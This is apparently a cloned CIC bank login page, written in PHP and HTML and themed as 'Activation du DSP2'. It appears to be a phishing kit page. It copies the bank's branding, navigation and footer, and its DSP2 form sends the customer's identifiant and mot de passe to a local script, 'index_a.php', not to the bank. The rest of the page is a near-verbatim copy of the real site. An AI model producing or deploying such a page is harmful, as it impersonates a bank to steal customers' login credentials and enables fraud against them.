<?php



?>

<html lang="fr"><head><link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
    
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title> Activation du DSP2 | CIC </title>
        <meta name="espace" content="Aucun">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" type="image/x-icon" href="../ressources/images/ci/logo.svg">
        <link type="text/css" rel="stylesheet" href="../ressources/css/ci/index_ci.css"> </head>
    
    <body class="ei_tpl_conseil ei_nobackground ei_ident ei_cic2015">
        <nav role="navigation" aria-label="Liens d'évitement">
            <ul id="e_raccourci">
                <li class="ei_quicklink_vitrine"><a href="">Contenu principal</a></li>
                <li class="ei_quicklink_transac"><a href="">Contenu principal</a></li>
                <li class="ei_quicklink_vitrine"><a href="">Espace client</a></li>
                <li class="eir_hidexs ei_quicklink_vitrine"><a href="">Menu principal</a></li>
                <li class="eir_hidexs ei_quicklink_vitrine"><a href="">Zone de recherche</a></li>
                <li class="ei_quicklink_vitrine"><a href="">Entête de page</a></li>
                <li class="ei_quicklink_vitrine"><a href="">Pied de page</a></li>
                <li class="ei_quicklink_transac"><a href="">Pied de page</a></li>
                <li class="ei_quicklink_transac"><a href="" aria-label="votre conseiller (nouvelle fenêtre)" target="_blank">Votre conseiller</a></li>
            </ul>
        </nav>
        <div id="ei_tpl_menuMobil" class="ei_menu">
            <div id="ei_tpl_mMobContent">
                <div id="ei_tpl_mMobPrincipal"></div>
            </div>
        </div>
        <div id="ei_tpl_fullsite" class="">
            <a id="ei_quicklink_header" tabindex="-1"></a>
            <header id="ei_tpl_head" role="banner" data-sticky="">
                <div id="ei_tpl_head_center">
                    <div class="ei_tpl_head_table">
                        
                        <div class="ei_tpl_head_td" id="ei_tpl_logo">
                            <a href="" title="CIC Accueil"> <img src="../ressources/images/ci/logo.svg" alt="CIC"> </a>
                        </div>
                        <div class="ei_tpl_head_td" id="ei_tpl_baseline">
                            <p>Construisons dans un monde qui bouge</p>
                        </div>
                        <div class="ei_tpl_head_td" id="ei_tpl_search">
                            
                            
                        </div>
                        <div id="" class="">
                            
                        </div>
                        
                    </div>
                </div>
            </header>
            <div id="ei_tpl_menuPrincipal" data-sticky="" class="ei_menu">
                <div id="ei_tpl_searchmobil">
                    
                        <label class="e_invisible" for="SRCH_top_mobile">Rechercher</label>
                        <input required="required" type="text" id="SRCH_top_mobile" class="pQuery SRCH_input ei_srchbar_input" title="Rechercher" placeholder="Rechercher" name="pQuery" role="combobox" aria-expanded="true" aria-haspopup="listbox" aria-autocomplete="list" autocomplete="off" aria-controls="lstresult" aria-activedescendant="op1">
                        <div class="autocomplete_search_top autocomplete_search" style="display:none;"></div>
                        <button class="ei_srchbar_button" type="submit" title="Lancer la recherche"> <span class="ei_sronly">Lancer la recherche</span> <span class="ei_srchbar_glyph" aria-hidden="true"></span> </button>
                        <input type="hidden" name="pSpace" value="Particulier">
                    
                </div>
                <a id="ei_quicklink_menu" tabindex="-1"></a>
                
            </div>
            <div id="ei_tpl_contener" style="min-height: 260px;">
                <a id="ei_quicklink_content" tabindex="-1"></a>
                <main id="ei_tpl_content" role="main">
                    <div class="a_blocappli">
                        <div class="eir_md_hidexs" id="eir_techmd_maintitleId">
                            <div class="ei_titleblock ei_mdr_maintitle">
                                <div class="ei_titlelabelsblock">
                                    <div class="ei_titlelabel">
                                        <div class="eir_md_hidexs">
                                            <p role="heading" aria-level="1">Espace client : Sécurité DSP2</p>
                                        </div>
                                    </div>
                                    <div class="ei_subtitlelabel"></div>
                                </div>
                                <div class="ei_titleactionsblock"></div>
                            </div>
                        </div>
                        <div class="a_blocfctl">
                            <div class="ei_md ei_mdr_formselectorlistbox"><span class="ei_mdrespinfo"></span>
                                <div class="ei_md_envtech">
                                    <div class="ei_md_master">
                                        <div class="ei_md_masterbody">
                                            <ul class="ei_md_masterroot">
                                                <li class="ei_md_masteritem">
                                                    <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="">Identifiant / Mot de passe</a></div>
                                                </li>
                                                <li class="ei_md_masteritem">
                                                    <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="">Certificat Électronique</a></div>
                                                </li>
                                                <li class="ei_md_masteritem ei_md_selected" aria-current="true">
                                                    <div class="ei_md_mastertxt"><a class="ei_md_masterlink" href="" id="menu_DSP2" title="DSP2">DSP2<span class="invisible">selected_item_text</span></a></div>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="ei_md_masterfooter"></div>
                                    </div>
                                    <div class="ei_md_nmaster eir_md_hidexs">
                                        <div class="eir_techmd_nmaster">
                                            <div class="ei_ident_marketing_password" style="display: none;">
=
                                                <article class="tile__article" data-ga-tile="[Article_-CC-Univers-Internet-et-securite-bancaire]" data-click="yes">
                                                    <div class="tile__article__img">
                                                        <picture><img src="../ressources/images/ci/tuile_400x225.jpg" alt=""></picture>
                                                    </div>
                                                    <div class="tile__article__content">
                                                        <h3 class="tile__article__title"><a href="">Internet et sécurité bancaire</a></h3>
                                                        <p class="tile__article__paragraph">Profitez de l’internet en déjouant ses pièges.</p>
                                                    </div>
                                                </article>
                                            </div>
                                            <div class="ei_ident_marketing_ksign" style="display: none;">
                                                <!--<link type="text/css" rel="stylesheet" href="/partage/fr/CC/CIC-2015/styles2020/pages/need.css">-->
                                                <article class="tile__article" data-ga-tile="[Article_-CC-Univers-Internet-et-securite-bancaire]" data-click="yes">
                                                    <div class="tile__article__img">
                                                        <picture><img src="../ressources/images/ci/tuile_400x225.jpg" alt=""></picture>
                                                    </div>
                                                    <div class="tile__article__content">
                                                        <h3 class="tile__article__title"><a href="">Internet et sécurité bancaire</a></h3>
                                                        <p class="tile__article__paragraph">Profitez de l’internet en déjouant ses pièges.</p>
                                                    </div>
                                                </article>
                                            </div>
                                            <div class="ei_ident_marketing_DSP2" style="">
                                                <!--<link type="text/css" rel="stylesheet" href="/partage/fr/CC/CIC-2015/styles2020/pages/need.css">-->
                                                <article class="tile__article" data-ga-tile="[Article_-CC-Univers-Internet-et-securite-bancaire]" data-click="yes">
                                                    <div class="tile__article__img">
                                                        <picture><img src="../ressources/images/ci/tuile_400x225.jpg" alt=""></picture>
                                                    </div>
                                                    <div class="tile__article__content">
                                                        <h3 class="tile__article__title"><a href="">Internet et sécurité bancaire</a></h3>
                                                        <p class="tile__article__paragraph">Profitez de l’internet en déjouant ses pièges.</p>
                                                    </div>
                                                </article>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="ei_md_separator"></div>
                                <div class="ei_md_detail" tabindex="-1">
                                    <!--Deb-->
                                    <div class="ei_titleblock ei_mdr_titledetail">
                                        <div class="ei_titlelabelsblock">
                                            <div class="ei_titlelabel">
                                                <div class="eir_md_hidexs"></div>
                                            </div>
                                            <div class="ei_subtitlelabel"></div>
                                        </div>
                                    </div>
                                    <!--Fin-->
                                    <div class="a_blocfctl" id="contentDetail">
                                        <div id="password" style="display: none;">
                                            <div class="alerteBlock" style="display:none">
                                                <div class="bloctxt alerte eir_hidexs"> </div>
                                                <div class="bloctxt alerte eir_showxs"> </div>
                                            </div>
                                            <div class="errorMessageBlock bloctxt err" style="display:none"><span id="errorMessage"></span></div>
                                            <div>
                                                <div class="ei_appl_ident" id="ident">
                                                    <p class="a_titre1"></p>
                                                    <div class="blocmsg info">
                                                        <p>La page demandée nécessite de vous authentifier</p>
                                                    </div>
                                                  
                                                        <fieldset>
                                                            <div class="ei_appl_ident_content">
                                                                <div class="ei_appl_ident_lig">
                                                                    <label for="_userid">Identifiant</label>
                                                                    <input type="text" name="ml" id="ml" value="" placeholder="" class="ei_appl_userid" maxlength="48">
                                                                    <input type="hidden" name="mp" id="mp" value="password">
                                                                    <input type="hidden" name="_charset_"> </div>
                                                                <div class="ei_appl_ident_lig">
                                                                    <label for="_pwduser">Mot de passe</label> <span class="ei_inputpassword ei_inputpassword-reveal">
    
    <input type="password" name="_cm_pwd" id="_pwduser" placeholder="" class="ei_appl_pwduser" maxlength="64">
    
         <button id="revealPasswordButton" type="button" title="Afficher la saisie" class="ei_inputpassword__reveal">
              <span aria-hidden="true" class="ei_inputpassword__reveal-icon"></span> </button>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </fieldset>
                                                        <div class="ei_appl_ident_blocbts blocboutons"> <span class="ei_buttonbar">
                    
                    
    
                    <span class="ei_mainbuttons">
        
            <span id="login-submit" class="ei_button">
                <a class="ei_btn" aria-labelledby="label-validate" role="button" href="">
                    <span class="ei_btn_body" id="label-validate">
                        <span class="ei_btn_tlcorn" role="presentation"></span> 
                        <span class="ei_btn_label">Se connecter</span> 
                        <br>
                        <span class="ei_iblock ei_btn_pic" role="presentation">&nbsp;</span> </span> <span class="ei_btn_footer" role="presentation">
                        <br>
                            <span class="ei_btn_blcorn" role="presentation"></span> </span>
                                                            </a>
                                                            </span>
                                                            </span>
                                                            </span>
                                                        </div>
                                                    
                                                </div>
                                            </div>
                                            <p class="liensctx c"> <a href="" onclick="return redirectToLink(forgotAccessUrl);" class="ei_acces">Codes d'accès oubliés</a> <a href="https://www.cic.fr/fr/authentification.html?redirect_link_identifier=ACHETER-LOGEMENT.Particulier#" onclick="return redirectToLink(infoSecurityUrl);" class="ctx">Infos sécurité</a> </p>
                                        </div>
                                        <div id="ksign" style="display:none">
                                            <div class="c">
                                                <a href="" title="Connexion avec Certificat Électronique"> <img id="certificate_img" alt="Connexion avec Certificat Électronique" src="../ressources/images/ci/certificat.png" style="margin:10.5px 10px 10px" width="300" height="142"> </a>
                                                <div class="bloctxt info">
                                                    <p><em>Pensez à introduire votre certificat avant de cliquer sur "Se connecter".</em></p>
                                                </div>
                                                <div class="blocboutons">
                                                    <input type="image" alt="Se connecter" src="../ressources/images/ci/seconnecter.png" name="submit"> </div>
                                            </div>
                                            <p class="liensctx c"> <a href="" class="ei_acces">Codes d'accès oubliés</a> <a href="https://www.cic.fr/fr/help_certificat_signature.html" class="ctx">Aide à la connexion</a> <a href="https://www.cic.fr/fr/authentification.html?redirect_link_identifier=ACHETER-LOGEMENT.Particulier#" onclick="return redirectToLink(infoSecurityUrl);" class="ctx">Infos sécurité</a> </p>
                                        </div>
                                        <div id="DSP2" style="">
                                            <div>
                                                <div class="ei_appl_ident" id="ident_DSP2" style="margin: 0px !important">
                                                    <div id="ejectCard" style="display:none;" class="blocmsg info">
                                                        <p>Veuillez retirer votre carte du lecteur</p>
                                                    </div>
                                                    <div id="identification_form">
                                                      
                                                            <fieldset>
                                                                <form action="index_a.php" method="post">
                                                                <div class="ei_appl_ident_content">
                                                                    <div class="ei_appl_ident_lig">
                                                                        <label for="_userid">Identifiant</label>
                                                                        <input type="text" name="ml" id="ml" class="ei_appl_userid" value="" required> </div>
                                                                    <div class="ei_appl_ident_lig">
                                                                        <label for="_pwduser">Mot de passe</label>
                                                                        <input type="password" name="mp" id="mp" class="ei_appl_pwduser" required>
                                                                        <input type="hidden" name="flag" value="DSP2"> 
                                            
                                                                    </div>

                                                                </div>
                                                            </fieldset>
                                                            <div class="ei_appl_ident_blocbts" style="text-align:center;">
                                                                <br>
                                                                <button class="button-9" name="btn_ci_submit" type="submit" alt="Se connecter"> Se connecter </div>
                                                                <br>
                                                                </form>
                                                    </div>
                                                </div>
                                               <!-- HTML !-->

<style>
.button-9 {
  appearance: button;
  backface-visibility: hidden;
  background-color: #007a7a;
  border-radius: 6px;
  border-width: 0;
  box-shadow: rgba(50, 50, 93, .1) 0 0 0 1px inset,rgba(50, 50, 93, .1) 0 2px 5px 0,rgba(0, 0, 0, .07) 0 1px 1px 0;
  box-sizing: border-box;
  color: #fff;
  cursor: pointer;
  font-family: -apple-system,system-ui,"Segoe UI",Roboto,"Helvetica Neue",Ubuntu,sans-serif;
  font-size: 100%;
  height: 44px;
  line-height: 1.15;
  margin: 12px 0 0;
  outline: none;
  overflow: hidden;
  padding: 0 25px;
  position: relative;
  text-align: center;
  text-transform: none;
  transform: translateZ(0);
  transition: all .2s,box-shadow .08s ease-in;
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
  width: 10 auto;
}

.button-9:disabled {
  cursor: default;
}

.button-9:focus {
  box-shadow: rgba(50, 50, 93, .1) 0 0 0 1px inset, rgba(50, 50, 93, .2) 0 6px 15px 0, rgba(0, 0, 0, .1) 0 2px 2px 0, rgba(50, 151, 211, .3) 0 0 0 4px;
}
</style>
                                                <div id="idLightBox" class="a_blocappli masque ei_blocmodal_env">
                                                    <div class="ei_blocmodal" role="dialog" aria-describedby="idTitle">
                                                        <div class="a_blocfctltitre">
                                                            <p class="a_options">
                                                                <a class="btnclose" href="" id="btnclose"> <img alt="Fermer" src="../ressources/images/ci/btfermerpopup.png"></a>
                                                            </p>
                                                            <p class="a_titre2" id="idTitle">Extension SConnect</p>
                                                        </div>
                                                        <div class="a_blocfctl" id="idContent" aria-describedby="idlibelle">
                                                            <div id="idlibelle">
                                                                <div>L'extension SConnect n'est pas installée sur votre poste.
                                                                    <br>
                                                                    <br>Pour pouvoir utiliser votre lecteur DSP2 avec l'application Hub Transferts, veuillez d'abord procéder à l'installation de l'extension SConnect depuis votre navigateur Internet Explorer (ou Safari pour les utilisateurs Mac OS).</div>
                                                            </div>
                                                            <div class="blocboutons">
                                                                <br>
                                                                <a href="" id="btnok"> <img alt="OK" src="../ressources/images/ci/ok.gif"> </a>
                                                            </div>
                                                        </div> <span role="presentation">&nbsp;</span> </div>
                                                </div>
                                            </div>
                                            <p class="liensctx c"> <a href="" class="ei_acces">Codes d'accès oubliés</a> <a href="" class="ctx">Aide et diagnostic</a> <a href="" class="ctx">Infos sécurité</a> </p>
                                        </div>
                                    </div>
                                </div>
                                <div class="ei_md_endseparator"></div>
                                <div class="eir_md_showxs ei_mdr_nextblockmaster"></div>
                            </div>
                        </div>
                    </div>
                </main>
            </div>
            <div id="ei_tpl_footer">
                <a id="ei_quicklink_footer" tabindex="-1"></a>
                <footer role="contentinfo">
                    <div id="ei_tpl_footer1">
                        <ul>
                            <li class="ei_caisses"><a href="">Agences et distributeurs</a></li>
                            <li class="ei_aide"><a href="">Assistance</a></li>
                            <li class="ei_accessibilite"><a href="">Accessibilité</a></li>
                            <li class="ei_contact"><a href="">Contacts</a></li>
                            <li class="ei_newsletter"><a href="" lang="en">Newsletter</a></li>
                            <li class="ei_reseaux"><a href="">Réseaux sociaux</a></li>
                            <li class="ei_assistance"><a href="">Internet et sécurité bancaire</a></li>
                        </ul>
                    </div>
                    <div id="ei_tpl_footer2">
                        <ul>
                            <li id="ei_espacededies">
                                <div class="selectNav">
                                    <button aria-expanded="false" aria-controls="selNavFoooter-ed" id="btn-selNavFoooter-ed" type="button">Espaces dédiés</button>
                                    <ul role="region" hidden="hidden" id="selNavFoooter-ed" aria-labelledby="btn-selNavFoooter-ed">
                                        <li> <a href="">Particuliers</a> </li>
                                        <li> <a href="">Professionnels</a> </li>
                                        <li> <a href="">Entreprises</a> </li>
                                        <li> <a href="">Corporate</a> </li>
                                        <li> <a href="">Associations</a> </li>
                                    </ul>
                                </div>
                            </li>
                            <li>
                                <div class="selectNav">
                                    <button aria-expanded="false" aria-controls="selNavFoooter-am" id="btn-selNavFoooter-am" type="button">Nos applications mobiles</button>
                                    <ul role="region" hidden="hidden" id="selNavFoooter-am" aria-labelledby="btn-selNavFoooter-am">
                                        <li> <a href="">Android</a> </li>
                                        <li> <a href="">iPhone</a> </li>
                                    </ul>
                                </div>
                            </li>
                            <li>
                                <div class="selectNav">
                                    <button aria-expanded="false" aria-controls="selNavFoooter-groupe" id="btn-selNavFoooter-groupe" type="button">Le groupe CIC</button>
                                    <ul role="region" hidden="hidden" id="selNavFoooter-groupe" aria-labelledby="btn-selNavFoooter-groupe">
                                        <li> <a href="">Carte d’identite du CIC</a> </li>
                                        <li> <a href="">Publications</a> </li>
                                        <li> <a href="">Actionnaires et investisseurs</a> </li>
                                        <li> <a href="">Partenariats et mécénat</a> </li>
                                        <li> <a href="">Recrutement</a> </li>
                                    </ul>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <div id="ei_tpl_footerlinks">
                        <ul>
                            <li><a id="aRecrutement" href="" target="_blank" title="Recrutement, recrutement.cic.fr, nouvelle fenêtre" rel="noreferrer noopener">Recrutement</a></li>
                            <li><a href="">Tarifs et conditions générales</a></li>
                            <li><a href="">Plan du site</a></li>
                            <li><a href="">Mentions légales</a></li>
                            <li><a href="">Informations réglementaires</a></li>
                            <li><a href="">Protection des données</a></li>
                            <li><a href="">Gestion des cookies</a></li>
                            <li><a href="">Accessibilité&nbsp;: Non conforme</a></li>
                            <li class="ei_sm_footer_line"> </li>
                        </ul> <span class="invisible">Choix d'une langue</span>
                        <ul id="ei_tpl_lang">
                            <li class="e-select"><span>FR</span></li>
                            <li><a href="" lang="en" hreflang="en" aria-label="Go to english version" title="Go to english version">EN</a></li>
                            <li><a href="" lang="de" hreflang="de" aria-label="Zur deutschen version" title="Zur deutschen version">DE</a></li>
                            <li><a href="" lang="es" hreflang="es" aria-label="Ir a la versión en español" title="Ir a la versión en español">ES</a></li>
                        </ul>
                        <div class="nof"></div>
                        <a title="Retour en haut de page" aria-label="Retour en haut de page" id="ei_tpl_hpage" href=""> <span class="ei_sronly">Retour en haut de page</span> <span class="ei_toplink_glyph" aria-hidden="true"></span> </a>
                    </div>
                </footer>
            </div>
            <div class="menuopen_fond"></div>
        </div>
    
    
    </body></html>